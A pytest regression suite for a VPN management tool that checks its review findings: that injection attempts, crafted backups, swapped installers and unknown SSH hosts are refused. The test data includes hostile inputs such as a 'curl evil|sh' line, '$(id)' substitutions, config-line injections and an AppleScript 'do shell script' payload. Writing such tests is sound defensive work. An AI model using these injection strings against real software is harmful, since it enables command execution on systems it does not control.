"""Regression tests for the independent review of the Tunnel companion code.

Each test names the finding it pins. All offline; nothing runs as root except
the installer-runner test, which only executes `echo` through bash.
"""
from __future__ import annotations

import json
import os
import shutil
import stat
import subprocess
import time
from pathlib import Path

import pytest

from agents.vpn_agent.server import backup, bootstrap, deploy, paths, provision, store
from agents.vpn_agent.server.model import MODE_NATIVE, MODE_REMOTE
from agents.vpn_agent.services import privileged, tor
from services import vpn_execution


@pytest.fixture()
def state(tmp_path, monkeypatch):
    monkeypatch.setenv("VPN_AGENT_STATE_DIR", str(tmp_path / "st"))
    return tmp_path


def site(name="home", mode=MODE_REMOTE):
    s = provision.init_site(name, mode, "vpn.example.org")
    provision.add_peer(s, "phone")
    return s


# ── 1. hostile values never reach a script or config ──
HOSTILE_NAMES = ['home$(id>/tmp/p)', 'a\ncurl evil|sh #', 'x"y', "x'y", "x`id`", "-rf", ""]


@pytest.mark.parametrize("bad", HOSTILE_NAMES)
def test_hostile_site_and_peer_names_are_refused(state, bad):
    with pytest.raises(ValueError):
        provision.init_site(bad, MODE_REMOTE, "vpn.example.org")
    s = site()
    with pytest.raises(ValueError):
        provision.add_peer(s, bad or " ")
    assert [p.name for p in store.load_site("home").peers] == ["phone"]


@pytest.mark.parametrize("field,value", [
    ("wg_interface", "wg0;touch /tmp/p;"),
    ("dns", ["1.1.1.1\nscript-security 2"]),
    ("lan_routes", ["10.0.0.0/8; reboot"]),
    ("endpoint_host", "a.example $(id)"),
    ("wg_port", "51820"),
    ("enable_openvpn", "yes"),
])
def test_unsafe_fields_block_save_render_and_teardown(state, field, value):
    s = site(mode=MODE_NATIVE)
    setattr(s, field, value)
    assert s.strict_problems()
    with pytest.raises(ValueError):
        store.save_site(s)
    with pytest.raises(ValueError):
        bootstrap.bootstrap_for(s, "linux")
    with pytest.raises(ValueError):
        deploy.build_teardown_script(s)


def test_peer_notes_with_newline_are_refused(state):
    s = site()
    s.peers[0].notes = "ok\n[Interface]\nPostUp = id"
    with pytest.raises(ValueError):
        store.save_site(s)


def _hostile_backup(state, mutate) -> Path:
    s = site()
    s.check_strict = lambda: None          # bypass to build an attacker's file
    mutate(s)
    out = state / "evil.vpnbackup"
    out.write_bytes(backup.export_site(s, "correct horse battery"))
    return out


@pytest.mark.parametrize("mutate", [
    lambda s: setattr(s, "name", "home$(id)"),
    lambda s: setattr(s.peers[0], "name", "p\n[Interface]\nPostUp = id"),
    lambda s: setattr(s, "dns", ['1.1.1.1"\nup "/tmp/x']),
    lambda s: setattr(s, "wg_port", "x"),
])
def test_hostile_backup_is_refused_on_import(state, mutate):
    path = _hostile_backup(state, mutate)
    with pytest.raises(backup.BackupError):
        backup.read_backup(path, "correct horse battery")


# ── 2. AppleScript injection through the dialog prompt ──
def test_dialog_prompt_and_script_are_both_escaped(monkeypatch):
    seen = {}
    monkeypatch.setattr(privileged, "run", lambda argv, t: seen.update(argv=argv) or (True, ""))
    privileged.run_with_dialog('echo "hi" \\ there',
                               'Set up VPN" & (do shell script "id > /tmp/pwn") & "')
    expr = seen["argv"][2]
    # Only the four delimiting quotes remain once escaped quotes are removed.
    assert expr.replace('\\\\', '').replace('\\"', '').count('"') == 4
    assert expr.startswith('do shell script "') and expr.endswith("with administrator privileges")


# ── 3. backup KDF parameters are bounded ──
@pytest.mark.parametrize("n,r,p", [(2 ** 24, 8, 1), (3, 8, 1), (2 ** 15, 8, 2 ** 20), (2 ** 10, 8, 1)])
def test_crafted_kdf_parameters_are_refused_fast(state, n, r, p):
    s = site()
    blob = json.loads(backup.export_site(s, "correct horse battery"))
    blob["kdf"].update(n=n, r=r, p=p)
    started = time.time()
    with pytest.raises(backup.BackupError):
        backup.import_site(json.dumps(blob).encode(), "correct horse battery")
    assert time.time() - started < 2


def test_older_backups_at_n_2_15_still_open(state, monkeypatch):
    s = site()
    monkeypatch.setattr(backup, "SCRYPT_N", 2 ** 15)
    blob = backup.export_site(s, "correct horse battery")
    monkeypatch.undo()
    assert backup.import_site(blob, "correct horse battery").name == "home"


# ── 4. no key material to a host whose key was never seen ──
def test_library_deploy_refuses_unknown_host(state, monkeypatch):
    s = site()
    s.ssh.host = "203.0.113.5"
    monkeypatch.setattr(deploy.shutil, "which", lambda n: "/usr/bin/" + n)
    monkeypatch.setattr(deploy, "host_fingerprint", lambda site: "")
    monkeypatch.setattr(deploy, "_run_remote", lambda *a: pytest.fail("streamed to an unknown host"))
    result = deploy.deploy(s)
    assert not result.success and "Check SSH" in result.summary()
    assert deploy.deploy(s, dry_run=True).success           # preview still allowed


# ── 5/6. interrupted deploys, swapped installers ──
def test_stale_installers_are_swept(state):
    d = paths.ensure_private_dir(paths.state_dir() / "tmp")
    (d / "install-abc.sh").write_text("PrivateKey = x")
    (d / "keep.txt").write_text("x")
    assert deploy.sweep_stale_installers() == 1
    assert not (d / "install-abc.sh").exists() and (d / "keep.txt").exists()


@pytest.mark.skipif(os.geteuid() != 0 or not shutil.which("shasum"),
                    reason="runs the root runner for real; needs root and shasum")
@pytest.mark.parametrize("swap", [False, True])
def test_runner_refuses_an_installer_swapped_after_writing(state, monkeypatch, swap):
    s = site(mode=MODE_NATIVE)
    monkeypatch.setattr(os, "geteuid", lambda: 501)
    marker = state / "ran.txt"

    def fake_root(cmd, prompt, timeout=0, *, allow_cached_sudo=True):
        if swap:
            import re, shlex
            target = shlex.split(re.search(r"/bin/cat (.+?) > ", cmd).group(1))[0]
            Path(target).write_text(f"echo EVIL > {marker}\n")
        proc = subprocess.run(["/bin/bash", "-c", cmd], capture_output=True, text=True)
        return proc.returncode == 0, proc.stdout + proc.stderr
    monkeypatch.setattr(privileged, "run_as_root", fake_root)
    result = deploy._run_local(s, f"echo GOOD > {marker}\n", None)
    if swap:
        assert not marker.exists()                       # the swapped script never ran
    else:
        assert marker.read_text().strip() == "GOOD"
    assert result.success is (not swap)
    if swap:
        assert "changed before it ran" in result.output


def test_gate_audits_started_before_the_worker_runs(state, monkeypatch, tmp_path):
    from ui.panels import vpn_gate
    from ui.panels.vpn_privacy import PrivacyTab
    from tests.test_vpn_privacy_tab import SyncWorker
    audit = tmp_path / "a.jsonl"
    monkeypatch.setattr(vpn_execution, "default_audit_path", lambda: audit)
    seen = []

    def stop():
        seen.append([json.loads(l)["outcome"] for l in audit.read_text().splitlines()])
        return True, "ok"
    monkeypatch.setattr(vpn_gate, "CallWorker", SyncWorker)
    monkeypatch.setattr(tor, "stop", stop)
    monkeypatch.setattr(tor, "is_installed", lambda: False)
    PrivacyTab().stop_tor()
    assert seen == [["started"]]


# ── 7. tls-crypt and other PEM keys are redacted ──
def test_pem_private_blocks_are_redacted_but_certificates_kept(state):
    s = site()
    text = s.tls_crypt_key + "\n" + s.ca_key_pem + "\n" + s.ca_cert_pem
    red = vpn_execution.redact_secrets(text)
    for line in (s.tls_crypt_key.splitlines()[3:-3] + s.ca_key_pem.splitlines()[1:-1]):
        assert line not in red
    assert "-----BEGIN CERTIFICATE-----" in red        # certificates are public


# ── 8. client config names cannot collide ──
def test_use_for_connect_files_are_unique_per_site(state, monkeypatch, tmp_path):
    from PySide6.QtWidgets import QMessageBox
    from services import vpn_connection
    from ui.panels import vpn_gate
    from ui.panels.vpn_servers import ServersTab
    from tests.test_vpn_privacy_tab import SyncWorker
    monkeypatch.setattr(vpn_execution, "default_audit_path", lambda: tmp_path / "a.jsonl")
    monkeypatch.setattr(vpn_gate, "CallWorker", SyncWorker)
    monkeypatch.setattr(QMessageBox, "question", staticmethod(lambda *a, **k: QMessageBox.Yes))
    for name in ("Office London", "Office Londonderry"):
        site(name)
    tab = ServersTab()
    for name in ("Office London", "Office Londonderry"):
        tab.refresh_sites(keep=name)
        tab.peer_table.setCurrentCell(0, 0)
        tab.register_profile()
    profiles = [p for p in vpn_connection.load_connectable_profiles(False) if p["name"].startswith("Office")]
    paths_ = {p["config_path"] for p in profiles}
    assert len(profiles) == 2 and len(paths_) == 2
    assert all(len(Path(p).stem) <= 15 for p in paths_)


# ── 9. secret files never inherit a looser mode or follow a link ──
def test_write_private_replaces_loose_files_and_links(state):
    d = paths.ensure_private_dir(paths.state_dir() / "x")
    loose = d / "a.conf"
    loose.write_text("old")
    loose.chmod(0o644)
    paths.write_private(loose, "SECRET")
    assert stat.S_IMODE(loose.stat().st_mode) == 0o600 and loose.read_text() == "SECRET"
    outside = state / "outside.txt"
    outside.write_text("untouched")
    link = d / "b.conf"
    link.symlink_to(outside)
    paths.write_private(link, "SECRET")
    assert outside.read_text() == "untouched" and not link.is_symlink()


def test_backup_over_an_existing_loose_file_is_private(state):
    s = site()
    out = state / "b.vpnbackup"
    out.write_text("x")
    out.chmod(0o644)
    backup.write_backup(s, "correct horse battery", out)
    assert stat.S_IMODE(out.stat().st_mode) == 0o600


# ── 10. a foreign listener on the Tor port is not "our Tor" ──
def test_foreign_listener_is_not_reported_as_our_tor(state, monkeypatch):
    monkeypatch.setattr(tor, "is_installed", lambda: True)
    monkeypatch.setattr(tor, "is_running", lambda: True)
    started = []
    monkeypatch.setattr(tor.subprocess, "Popen", lambda *a, **k: started.append(a))
    ok, msg = tor.start()
    assert not ok and "Another program" in msg and started == []
    assert tor.is_ours() is False


# ── 11. a peer export is not a backup ──
def test_peer_export_does_not_count_as_backup(state):
    from agents.vpn_agent.server import export
    from ui.panels import vpn_servers
    s = site()
    export.export_peer(s, s.peers[0])
    assert vpn_servers.has_backup("home") is False
    vpn_servers.mark_backup("home")
    assert vpn_servers.has_backup("home") is True
